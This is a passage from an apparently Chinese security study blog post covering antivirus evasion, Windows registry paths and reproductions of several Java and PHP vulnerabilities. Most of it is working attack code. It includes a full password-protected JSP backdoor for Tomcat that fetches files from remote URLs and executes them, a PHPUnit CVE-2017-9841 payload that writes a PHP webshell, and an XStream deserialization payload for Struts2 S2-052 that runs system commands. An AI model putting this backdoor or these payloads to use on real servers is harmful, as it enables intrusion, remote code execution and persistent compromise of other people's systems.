<!DOCTYPE html>
<html>
<head>
    

    

    



    <meta charset="utf-8">
    
    
    
    
    <title>3-23 | 熊猫在路上</title>
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
    
    <meta name="theme-color" content="#3F51B5">
    
    
    <meta name="keywords" content="CVE,免杀,注册表">
    <meta name="description" content="学习免杀工具、注册表修改时间、CVE漏洞、流量分析">
<meta property="og:type" content="article">
<meta property="og:title" content="3-23">
<meta property="og:url" content="https://xiongmaozailushang.gitee.io/muggle/2020/03/23/3.23/index.html">
<meta property="og:site_name" content="熊猫在路上">
<meta property="og:description" content="学习免杀工具、注册表修改时间、CVE漏洞、流量分析">
<meta property="og:locale" content="ch">
<meta property="og:image" content="http://www.xt996.top/muggle/2020/03/23/3.23/nice.png">
<meta property="article:published_time" content="2020-03-23T01:55:34.000Z">
<meta property="article:modified_time" content="2020-03-23T09:30:32.263Z">
<meta property="article:author" content="熊猫在路上">
<meta property="article:tag" content="CVE">
<meta property="article:tag" content="免杀">
<meta property="article:tag" content="注册表">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="http://www.xt996.top/muggle/2020/03/23/3.23/nice.png">
    
    <link rel="shortcut icon" href="/muggle/favicon.ico">
    <link rel="stylesheet" href="//unpkg.com/hexo-theme-material-indigo@latest/css/style.css">
    <script>window.lazyScripts=[]</script>

    <!-- custom head -->
    

<meta name="generator" content="Hexo 4.2.0"></head>

<body>
    <div id="loading" class="active"></div>

    <aside id="menu" class="hide" >
  <div class="inner flex-row-vertical">
    <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="menu-off">
        <i class="icon icon-lg icon-close"></i>
    </a>
    <div class="brand-wrap" style="background-image:url(/muggle/img/brand.jpg)">
      <div class="brand">
        <a href="/muggle/" class="avatar waves-effect waves-circle waves-light">
          <img src="/muggle/img/avatar.jpg">
        </a>
        <hgroup class="introduce">
          <h5 class="nickname">熊猫在路上</h5>
          <a href="mailto:2439046455@qq.com" title="2439046455@qq.com" class="mail">2439046455@qq.com</a>
        </hgroup>
      </div>
    </div>
    <div class="scroll-wrap flex-col">
      <ul class="nav">
        
            <li class="waves-block waves-effect">
              <a href="/muggle/"  >
                <i class="icon icon-lg icon-home"></i>
                主页
              </a>
            </li>
        
            <li class="waves-block waves-effect">
              <a href="/muggle/archives"  >
                <i class="icon icon-lg icon-archives"></i>
                分类
              </a>
            </li>
        
            <li class="waves-block waves-effect">
              <a href="/muggle/tags"  >
                <i class="icon icon-lg icon-tags"></i>
                标签
              </a>
            </li>
        
            <li class="waves-block waves-effect">
              <a href="/muggle/categories"  >
                <i class="icon icon-lg icon-th-list"></i>
                归档
              </a>
            </li>
        
            <li class="waves-block waves-effect">
              <a href="https://github.com/xiongmaoyan" target="_blank" >
                <i class="icon icon-lg icon-github"></i>
                Github
              </a>
            </li>
        
            <li class="waves-block waves-effect">
              <a href="/muggle/custom"  >
                <i class="icon icon-lg icon-link"></i>
                测试
              </a>
            </li>
        
      </ul>
    </div>
  </div>
</aside>

    <main id="main">
        <header class="top-header" id="header">
    <div class="flex-row">
        <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light on" id="menu-toggle">
          <i class="icon icon-lg icon-navicon"></i>
        </a>
        <div class="flex-col header-title ellipsis">3-23</div>
        
        <div class="search-wrap" id="search-wrap">
            <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="back">
                <i class="icon icon-lg icon-chevron-left"></i>
            </a>
            <input type="text" id="key" class="search-input" autocomplete="off" placeholder="Search">
            <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="search">
                <i class="icon icon-lg icon-search"></i>
            </a>
        </div>
        
        
        <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="menuShare">
            <i class="icon icon-lg icon-share-alt"></i>
        </a>
        
    </div>
</header>
<header class="content-header post-header">

    <div class="container fade-scale">
        <h1 class="title">3-23</h1>
        <h5 class="subtitle">
            
                <time datetime="2020-03-23T01:55:34.000Z" itemprop="datePublished" class="page-time">
  2020-03-23
</time>


	<ul class="article-category-list"><li class="article-category-list-item"><a class="article-category-list-link" href="/muggle/categories/%E6%AF%8F%E6%97%A5%E5%AD%A6%E4%B9%A0%E5%B0%8F%E7%BB%93/">每日学习小结</a></li></ul>

            
        </h5>
    </div>

    


</header>


<div class="container body-wrap">
    
    <aside class="post-widget">
        <nav class="post-toc-wrap post-toc-shrink" id="post-toc">
            <h4>TOC</h4>
            <ol class="post-toc"><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#Xencrypt-免杀powershell"><span class="post-toc-number">1.</span> <span class="post-toc-text">Xencrypt(免杀powershell)</span></a></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#注册表"><span class="post-toc-number">2.</span> <span class="post-toc-text">注册表</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#注册表文件路径"><span class="post-toc-number">2.1.</span> <span class="post-toc-text">注册表文件路径</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#查看注册表中某一项修改时间"><span class="post-toc-number">2.2.</span> <span class="post-toc-text">查看注册表中某一项修改时间</span></a></li></ol></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#Tomcat"><span class="post-toc-number">3.</span> <span class="post-toc-text">Tomcat</span></a></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#CVE-2017-5638"><span class="post-toc-number">4.</span> <span class="post-toc-text">CVE-2017-5638</span></a></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#CVE-2017-9841"><span class="post-toc-number">5.</span> <span class="post-toc-text">CVE-2017-9841</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#漏洞概述"><span class="post-toc-number">5.1.</span> <span class="post-toc-text">漏洞概述:</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#漏洞版本："><span class="post-toc-number">5.2.</span> <span class="post-toc-text">漏洞版本：</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#基本原理："><span class="post-toc-number">5.3.</span> <span class="post-toc-text">基本原理：</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#漏洞复现："><span class="post-toc-number">5.4.</span> <span class="post-toc-text">漏洞复现：</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#漏洞修复："><span class="post-toc-number">5.5.</span> <span class="post-toc-text">漏洞修复：</span></a></li></ol></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#CVE-2017-9805-S2-052-漏洞复现"><span class="post-toc-number">6.</span> <span class="post-toc-text">CVE-2017-9805(S2-052)漏洞复现</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#漏洞概述-1"><span class="post-toc-number">6.1.</span> <span class="post-toc-text">漏洞概述</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#漏洞原理"><span class="post-toc-number">6.2.</span> <span class="post-toc-text">漏洞原理</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#漏洞影响版本"><span class="post-toc-number">6.3.</span> <span class="post-toc-text">漏洞影响版本</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#漏洞环境搭建以及复现"><span class="post-toc-number">6.4.</span> <span class="post-toc-text">漏洞环境搭建以及复现</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#漏洞防御"><span class="post-toc-number">6.5.</span> <span class="post-toc-text">漏洞防御</span></a></li></ol></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#看到的一些payload"><span class="post-toc-number">7.</span> <span class="post-toc-text">看到的一些payload</span></a></li></ol>
        </nav>
    </aside>


<article id="post-3.23"
  class="post-article article-type-post fade" itemprop="blogPost">

    <div class="post-card">
        <h1 class="post-card-title">3-23</h1>
        <div class="post-meta">
            <time class="post-time" title="2020-03-23 09:55:34" datetime="2020-03-23T01:55:34.000Z"  itemprop="datePublished">2020-03-23</time>

            
	<ul class="article-category-list"><li class="article-category-list-item"><a class="article-category-list-link" href="/muggle/categories/%E6%AF%8F%E6%97%A5%E5%AD%A6%E4%B9%A0%E5%B0%8F%E7%BB%93/">每日学习小结</a></li></ul>



            
<span id="busuanzi_container_page_pv" title="文章总阅读量" style='display:none'>
    <i class="icon icon-eye icon-pr"></i><span id="busuanzi_value_page_pv"></span>
</span>


        </div>
        <div class="post-content" id="post-content" itemprop="postContent">
            <figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
                    <img src="http://www.xt996.top/muggle/2020/03/23/3.23/nice.png" alt title>
                </div>
                <div class="image-caption"></div>
            </figure>

<p>学习免杀工具、注册表修改时间、CVE漏洞、流量分析</p>
<a id="more"></a>


<h1 id="Xencrypt-免杀powershell"><a href="#Xencrypt-免杀powershell" class="headerlink" title="Xencrypt(免杀powershell)"></a>Xencrypt(免杀powershell)</h1><p>一款基于PowerShell脚本实现的反病毒绕过工具(免杀powershell)</p>
<blockquote>
<p><a href="https://github.com/the-xentropy/xencrypt" target="_blank" rel="noopener">https://github.com/the-xentropy/xencrypt</a></p>
</blockquote>
<p>这里有稍微详细一点的教程</p>
<blockquote>
<p><a href="https://blog.csdn.net/lhh134/article/details/104640758" target="_blank" rel="noopener">https://blog.csdn.net/lhh134/article/details/104640758</a></p>
</blockquote>
<h1 id="注册表"><a href="#注册表" class="headerlink" title="注册表"></a>注册表</h1><h2 id="注册表文件路径"><a href="#注册表文件路径" class="headerlink" title="注册表文件路径"></a>注册表文件路径</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:\Windows\System32\config</span><br></pre></td></tr></table></figure>

<p>文件导出，注册表打开该目录下SYSTEM等文件查看</p>
<h2 id="查看注册表中某一项修改时间"><a href="#查看注册表中某一项修改时间" class="headerlink" title="查看注册表中某一项修改时间"></a>查看注册表中某一项修改时间</h2><p>第三方注册表工具 例如:Registry Workshop</p>
<p>打开即可查看修改时间</p>
<h1 id="Tomcat"><a href="#Tomcat" class="headerlink" title="Tomcat"></a>Tomcat</h1><p>PUT /FxCodeShell.jsp%20 </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page import&#x3D;&quot;java.util.Arrays&quot;%&gt;</span><br><span class="line">&lt;%@ page language&#x3D;&quot;java&quot; contentType&#x3D;&quot;text&#x2F;html; charset&#x3D;UTF-8&quot; pageEncoding&#x3D;&quot;UTF-8&quot;%&gt;</span><br><span class="line">&lt;%@ page import&#x3D;&quot;java.io.*,java.util.*,java.net.URL,java.net.HttpURLConnection&quot;%&gt;</span><br><span class="line">&lt;%</span><br><span class="line">    String view &#x3D; request.getParameter(&quot;view&quot;);</span><br><span class="line">    if (view &#x3D;&#x3D; null || view.equals(&quot;&quot;)) &#123;</span><br><span class="line">        String localOS &#x3D; System.getProperty(&quot;os.name&quot;);</span><br><span class="line">        List&lt;String&gt; osList;</span><br><span class="line">        String tomcatOS &#x3D; &quot;0&quot;;</span><br><span class="line">        String DEFAULT &#x3D; &quot;0&quot;;</span><br><span class="line">        String WINDOWS &#x3D; &quot;1&quot;;</span><br><span class="line">        String LINUX &#x3D; &quot;2&quot;;</span><br><span class="line">        osList &#x3D; new ArrayList&lt;String&gt;();</span><br><span class="line">        osList.add(&quot;Linux&quot;);</span><br><span class="line">        osList.add(&quot;Windows&quot;);</span><br><span class="line">        for (String os : osList) &#123;</span><br><span class="line">            if (localOS.contains(os)) &#123;</span><br><span class="line">                if (os.equals(&quot;Linux&quot;)) &#123;</span><br><span class="line">                    tomcatOS &#x3D; LINUX;</span><br><span class="line">                &#125; else if (os.equals(&quot;Windows&quot;)) &#123;</span><br><span class="line">                    tomcatOS &#x3D; WINDOWS;</span><br><span class="line">                &#125; else &#123;</span><br><span class="line">                    tomcatOS &#x3D; DEFAULT;</span><br><span class="line">                &#125;</span><br><span class="line">                break;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        out.write(tomcatOS + &quot;&lt;br&#x2F;&gt;&quot;);</span><br><span class="line">        response.setHeader(&quot;OS&quot;, tomcatOS);</span><br><span class="line">        return;</span><br><span class="line">    &#125;</span><br><span class="line">%&gt;</span><br><span class="line"></span><br><span class="line">&lt;%</span><br><span class="line">    String password &#x3D; &quot;FxxkMyLie1836710Aa&quot;;</span><br><span class="line">    if (!view.equals(password)) &#123;</span><br><span class="line">        return;</span><br><span class="line">    &#125;</span><br><span class="line">    int systemCode &#x3D; Integer.parseInt(request.getParameter(&quot;os&quot;));</span><br><span class="line">    String address &#x3D; request.getParameter(&quot;address&quot;);</span><br><span class="line">    String fileName &#x3D; null;</span><br><span class="line">    String path &#x3D; null;</span><br><span class="line">    String winPath &#x3D; &quot;%SystemRoot%&#x2F;Temp&#x2F;&quot;;</span><br><span class="line">    String linuxPath &#x3D; &quot;&#x2F;var&#x2F;tmp&#x2F;&quot;;</span><br><span class="line">    switch (systemCode) &#123;</span><br><span class="line">    case 1:</span><br><span class="line">        path &#x3D; winPath;</span><br><span class="line">        break;</span><br><span class="line">    default:</span><br><span class="line">        path &#x3D; linuxPath;</span><br><span class="line">        break;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    String[] urls &#x3D; address.split(&quot;,&quot;);</span><br><span class="line">    InputStream fileInputSteam &#x3D; null;</span><br><span class="line">    FileOutputStream fileOutputStream &#x3D; null;</span><br><span class="line">    for (int i &#x3D; 0; i &lt;&#x3D; urls.length - 1; i++) &#123;</span><br><span class="line">        try &#123;</span><br><span class="line">            String[] file &#x3D; urls[i].split(&quot;&#x2F;&quot;);</span><br><span class="line">            fileName &#x3D; file[file.length - 1];</span><br><span class="line">            out.write(&quot;Download:&quot; + urls[i] + &quot;&lt;br&gt;&quot;);</span><br><span class="line">            out.write(&quot;&lt;br&gt;filename:&quot; + fileName + &quot;&lt;br&gt;&quot;);</span><br><span class="line">            out.write(&quot;&lt;br&gt;Size:&quot; + urls.length + &quot;&lt;br&gt;&quot;);</span><br><span class="line">            out.write(</span><br><span class="line">                    &quot;-------------------------------------------------------------------------------------------------------&quot;</span><br><span class="line">                            + &quot;&lt;br&gt;&lt;br&gt;&quot;);</span><br><span class="line">            File isfile &#x3D; new File(path + fileName);</span><br><span class="line">            if (isfile.isFile()) &#123;</span><br><span class="line">                try &#123;</span><br><span class="line">                    Runtime exec &#x3D; Runtime.getRuntime();</span><br><span class="line">                    if (systemCode &#x3D;&#x3D; 1) &#123;</span><br><span class="line">                        exec.exec(path + fileName);</span><br><span class="line">                    &#125; else &#123;</span><br><span class="line">                        String chmod &#x3D; &quot;chmod 777 &quot; + path + fileName;</span><br><span class="line">                        exec.exec(chmod);</span><br><span class="line">                        exec.exec(&quot;nohup &quot; + path + fileName + &quot; &gt; &#x2F;dev&#x2F;null 2&gt;&amp;1 &amp;&quot;);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125; catch (Exception e1) &#123;</span><br><span class="line">                    e1.printStackTrace();</span><br><span class="line">                &#125;</span><br><span class="line">                continue;</span><br><span class="line">            &#125;</span><br><span class="line">            URL downloadUrl &#x3D; new URL(urls[i]);</span><br><span class="line">            HttpURLConnection conn &#x3D; (HttpURLConnection) downloadUrl.openConnection();</span><br><span class="line">            conn.setConnectTimeout(60000 * 3);</span><br><span class="line">            conn.setReadTimeout(60000 * 3);</span><br><span class="line">            fileInputSteam &#x3D; conn.getInputStream();</span><br><span class="line">            fileOutputStream &#x3D; new FileOutputStream(path + fileName);</span><br><span class="line">            int length &#x3D; -1;</span><br><span class="line">            byte[] b &#x3D; new byte[409600];</span><br><span class="line">            while ((length &#x3D; fileInputSteam.read(b)) !&#x3D; -1) &#123;</span><br><span class="line">                fileOutputStream.write(b, 0, length);</span><br><span class="line">                fileOutputStream.flush();</span><br><span class="line">            &#125;</span><br><span class="line">            if (conn !&#x3D; null) &#123;</span><br><span class="line">                conn.disconnect();</span><br><span class="line">            &#125;</span><br><span class="line">            if (fileInputSteam !&#x3D; null) &#123;</span><br><span class="line">                fileInputSteam.close();</span><br><span class="line">            &#125;</span><br><span class="line">            if (fileOutputStream !&#x3D; null) &#123;</span><br><span class="line">                fileOutputStream.close();</span><br><span class="line">            &#125;</span><br><span class="line">            Runtime exec &#x3D; Runtime.getRuntime();</span><br><span class="line">            if (systemCode &#x3D;&#x3D; 1) &#123;</span><br><span class="line">                exec.exec(path + fileName);</span><br><span class="line">            &#125; else &#123;</span><br><span class="line">                String chmod &#x3D; &quot;chmod 777 &quot; + path + fileName;</span><br><span class="line">                exec.exec(chmod);</span><br><span class="line">                exec.exec(&quot;nohup &quot; + path + fileName + &quot; &gt; &#x2F;dev&#x2F;null 2&gt;&amp;1 &amp;&quot;);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; catch (Exception e2) &#123;</span><br><span class="line">            e2.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure>



<h1 id="CVE-2017-5638"><a href="#CVE-2017-5638" class="headerlink" title="CVE-2017-5638"></a>CVE-2017-5638</h1><p>漏洞简介</p>
<p>Apache Struts是一套用于创建企业级Java Web 应用的开源MVC框架 。<br>Apache Struts 2.3.5 – 2.3.31版本及2.5 – 2.5.10版本存在远程代码执行漏洞（CNNVD-201703-152 ，CVE-2017-5638）。该漏洞是由于上传功能的异常处理函数没有正确处理用户输入的错误信息。导致远程攻击者可通过发送恶意的数据包，利用该漏洞在受影响服务器上执行任意命令。<br>漏洞编号：S2-045<br>CVE编号：CVE-2017-5638<br>漏洞类型：远程代码执行<br>漏洞级别：高危<br>漏洞风险：黑客通过利用漏洞可以实现远程命令执行。<br>影响版本：struts2.3.5 – struts2.3.31 , struts2.5 – struts2.5.10</p>
<h1 id="CVE-2017-9841"><a href="#CVE-2017-9841" class="headerlink" title="CVE-2017-9841"></a>CVE-2017-9841</h1><p>php unit 漏洞复现</p>
<h2 id="漏洞概述"><a href="#漏洞概述" class="headerlink" title="漏洞概述:"></a>漏洞概述:</h2><p>PHPUnit 是 PHP 程式语言中最常见的单元测试 (unit testing) 框架，通常phpunit使用composer非常流行的PHP依赖管理器进行部署,将会在当前目录创建一个vendor文件夹.phpunit生产环境中仍然安装了它,如果该编写器模块存在于Web可访问目录，则存在远程代码执行漏洞。</p>
<h2 id="漏洞版本："><a href="#漏洞版本：" class="headerlink" title="漏洞版本："></a>漏洞版本：</h2><p>4.8.19 ~ 4.8.27<br>5.0.10 ~ 5.6.2</p>
<h2 id="基本原理："><a href="#基本原理：" class="headerlink" title="基本原理："></a>基本原理：</h2><p>漏洞位于<code>/phpunit/src/Util/PHP/eval-stdin.php</code>。</p>
<p><code>eval(&#39;?&gt;&#39;.file_get_contents(&#39;php://input&#39;));</code></p>
<h2 id="漏洞复现："><a href="#漏洞复现：" class="headerlink" title="漏洞复现："></a>漏洞复现：</h2><p>总体来说就是向<code>vendor/phpunit/src/Util/PHP/eval-stdin.php</code>发送POST请求执行php代码。<br>例如直接执行phpinfo在这里插入图片描述在这里插入图片描述<br>也可以直接写入一句话木马。<code>&lt;?=file_put_contents(&quot;1.php&quot;, &#39;&lt;?=eval($_REQUEST[1]);?&gt;&#39;);</code><br>在这里插入图片描述成功生成，即可菜刀连接。<br>在这里插入图片描述</p>
<h2 id="漏洞修复："><a href="#漏洞修复：" class="headerlink" title="漏洞修复："></a>漏洞修复：</h2><p>果断一点，生产环境中直接删掉phpunit，没有用。</p>
<p>如果不想删，念旧情，直接升级吧，</p>
<p>懒打升级？那就直接设置权限，禁止访问该目录。</p>
<h1 id="CVE-2017-9805-S2-052-漏洞复现"><a href="#CVE-2017-9805-S2-052-漏洞复现" class="headerlink" title="CVE-2017-9805(S2-052)漏洞复现"></a>CVE-2017-9805(S2-052)漏洞复现</h1><h2 id="漏洞概述-1"><a href="#漏洞概述-1" class="headerlink" title="漏洞概述"></a>漏洞概述</h2><p>Apache Struts2的REST插件存在远程代码执行的高危漏洞,Struts2 REST插件的XStream插件的XStream组件存在反序列化漏洞,使用XStream组件对XML格式的数据包进行反序列化操作时,未对数据内容进行有效验证,存在安全隐患,可被远程攻击。</p>
<h2 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><p>根据Content-Type或URI扩展名来判断用户传入的数据包类型</p>
<p>根据漏洞原理，仅需要POST相应xml数据即可不需要考虑特定的url 因此构造poc</p>
<h2 id="漏洞影响版本"><a href="#漏洞影响版本" class="headerlink" title="漏洞影响版本"></a>漏洞影响版本</h2><p>Struts 2.1.2 - Struts 2.3.33</p>
<p>Struts 2.5 - Struts 2.5.12</p>
<h2 id="漏洞环境搭建以及复现"><a href="#漏洞环境搭建以及复现" class="headerlink" title="漏洞环境搭建以及复现"></a>漏洞环境搭建以及复现</h2><p>1、利用docker搭建vulhub漏洞环境</p>
<p>docker-compose up -d</p>
<p>　　</p>
<p>2、启动环境后,访问<code>http://172.17.0.1:8080/orders.xhtml</code>,可以看到showcase页面。</p>
<p>　　</p>
<p>3、由于rest-plugin会根据URI扩展名或 Content-Type来判断解析方法, 所以我们只需要修改orders.xhtml或修改Content-Type头为application/xml,即可在Body中传递XML数据。</p>
<p>3.1点击一个edit进行编译页面,burpsuit抓包</p>
<p>　　</p>
<p>3.2修改数据包,构造数据包</p>
<p>将Content-Type:application/x-www-form-urlencoded修改为:Content-Type:application/xml</p>
<p>Post数据修改成:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line">&lt;map&gt;</span><br><span class="line">&lt;entry&gt;</span><br><span class="line">     &lt;jdk.nashorn.internal.objects.NativeString&gt;</span><br><span class="line">       &lt;flags&gt;0&lt;&#x2F;flags&gt;</span><br><span class="line">       &lt;value class&#x3D;&quot;com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data&quot;&gt;</span><br><span class="line">         &lt;dataHandler&gt;</span><br><span class="line">           &lt;dataSource class&#x3D;&quot;com.sun.xml.internal.ws.encoding.xml.XMLMessage$XmlDataSource&quot;&gt;</span><br><span class="line">             &lt;is class&#x3D;&quot;javax.crypto.CipherInputStream&quot;&gt;</span><br><span class="line">               &lt;cipher class&#x3D;&quot;javax.crypto.NullCipher&quot;&gt;</span><br><span class="line">                 &lt;initialized&gt;false&lt;&#x2F;initialized&gt;</span><br><span class="line">                 &lt;opmode&gt;0&lt;&#x2F;opmode&gt;</span><br><span class="line">                 &lt;serviceIterator class&#x3D;&quot;javax.imageio.spi.FilterIterator&quot;&gt;</span><br><span class="line">                   &lt;iter class&#x3D;&quot;javax.imageio.spi.FilterIterator&quot;&gt;</span><br><span class="line">                     &lt;iter class&#x3D;&quot;java.util.Collections$EmptyIterator&quot;&#x2F;&gt;</span><br><span class="line">                     &lt;next class&#x3D;&quot;java.lang.ProcessBuilder&quot;&gt;</span><br><span class="line">                       &lt;command&gt;</span><br><span class="line">&lt;string&gt;touch&lt;&#x2F;string&gt;</span><br><span class="line">&lt;string&gt;&#x2F;tmp&#x2F;test.txt&lt;&#x2F;string&gt;</span><br><span class="line">                       &lt;&#x2F;command&gt;</span><br><span class="line">                       &lt;redirectErrorStream&gt;false&lt;&#x2F;redirectErrorStream&gt;</span><br><span class="line">                     &lt;&#x2F;next&gt;</span><br><span class="line">                   &lt;&#x2F;iter&gt;</span><br><span class="line">                   &lt;filter class&#x3D;&quot;javax.imageio.ImageIO$ContainsFilter&quot;&gt;</span><br><span class="line">                     &lt;method&gt;</span><br><span class="line">                       &lt;class&gt;java.lang.ProcessBuilder&lt;&#x2F;class&gt;</span><br><span class="line">                       &lt;name&gt;start&lt;&#x2F;name&gt;</span><br><span class="line">                       &lt;parameter-types&#x2F;&gt;</span><br><span class="line">                     &lt;&#x2F;method&gt;</span><br><span class="line">                     &lt;name&gt;foo&lt;&#x2F;name&gt;</span><br><span class="line">                   &lt;&#x2F;filter&gt;</span><br><span class="line">                   &lt;next class&#x3D;&quot;string&quot;&gt;foo&lt;&#x2F;next&gt;</span><br><span class="line">                 &lt;&#x2F;serviceIterator&gt;</span><br><span class="line">                 &lt;lock&#x2F;&gt;</span><br><span class="line">               &lt;&#x2F;cipher&gt;</span><br><span class="line">               &lt;input class&#x3D;&quot;java.lang.ProcessBuilder$NullInputStream&quot;&#x2F;&gt;</span><br><span class="line">               &lt;ibuffer&#x2F;&gt;</span><br><span class="line">               &lt;done&gt;false&lt;&#x2F;done&gt;</span><br><span class="line">               &lt;ostart&gt;0&lt;&#x2F;ostart&gt;</span><br><span class="line">               &lt;ofinish&gt;0&lt;&#x2F;ofinish&gt;</span><br><span class="line">               &lt;closed&gt;false&lt;&#x2F;closed&gt;</span><br><span class="line">             &lt;&#x2F;is&gt;</span><br><span class="line">             &lt;consumed&gt;false&lt;&#x2F;consumed&gt;</span><br><span class="line">           &lt;&#x2F;dataSource&gt;</span><br><span class="line">           &lt;transferFlavors&#x2F;&gt;</span><br><span class="line">         &lt;&#x2F;dataHandler&gt;</span><br><span class="line">         &lt;dataLen&gt;0&lt;&#x2F;dataLen&gt;</span><br><span class="line">       &lt;&#x2F;value&gt;</span><br><span class="line">     &lt;&#x2F;jdk.nashorn.internal.objects.NativeString&gt;</span><br><span class="line">     &lt;jdk.nashorn.internal.objects.NativeString reference&#x3D;&quot;..&#x2F;jdk.nashorn.internal.objects.NativeString&quot;&#x2F;&gt;</span><br><span class="line">   &lt;&#x2F;entry&gt;</span><br><span class="line">   &lt;entry&gt;</span><br><span class="line">     &lt;jdk.nashorn.internal.objects.NativeString reference&#x3D;&quot;..&#x2F;..&#x2F;entry&#x2F;jdk.nashorn.internal.objects.NativeString&quot;&#x2F;&gt;</span><br><span class="line">     &lt;jdk.nashorn.internal.objects.NativeString 